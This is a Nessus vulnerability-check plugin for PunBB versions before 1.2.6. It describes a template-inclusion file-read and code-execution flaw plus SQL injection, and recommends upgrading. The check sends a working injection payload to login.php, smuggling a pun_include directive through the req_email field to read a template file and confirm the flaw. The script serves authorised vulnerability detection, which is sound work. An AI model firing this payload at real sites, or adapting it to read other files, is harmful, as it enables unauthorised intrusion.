#
# (C) Tenable Network Security, Inc.
# 

include("compat.inc");

if (description) {
  script_id(18658);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-2193");
  script_bugtraq_id(14195, 14196);
  script_osvdb_id(17785, 17786);

  script_name(english:"PunBB < 1.2.6 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote version of PunBB contains a flaw in its template system
that can be exploited to read arbitrary local files or, if an attacker
can upload a specially crafted avatar, to execute arbitrary PHP code. 

In addition, the application fails to sanitize the 'temp' parameter of
the 'profile.php' script before using it in a database query, which
allows for SQL injection attacks." );
 # https://web.archive.org/web/20080413152553/http://www.hardened-php.net/index.39.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b029055d" );
 # https://web.archive.org/web/20080531113058/http://www.hardened-php.net/index.38.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7e87ce53" );
 script_set_attribute(attribute:"see_also", value:"http://securitytracker.com/id?1014420" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to PunBB 1.2.6 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:ND/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/07/07");
 script_cvs_date("$Date: 2017/04/25 20:29:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Detects multiple vulnerabilities in PunBB < 1.2.6");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");
  script_dependencies("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/punBB");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Check whether the script 'login.php' exists -- it's used in the exploit.
  r = http_send_recv3(method:"GET", item:string(dir, "/login.php"), port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ('method="post" action="login.php?action=in"' >< res) {
    # Try to exploit the flaw to read a file in the distribution.
    postdata = string(
      "form_sent=1&",
      'req_email=<pun_include%20"./include/template/main.tpl">@nessus.org'
    );
    r = http_send_recv3(method:"POST", item: dir+"/login.php?action=forget",
      port: port, content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if it looks like a template.
    if (egrep(string:res, pattern:"<pun_(head|page|title|char_encoding)>")) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
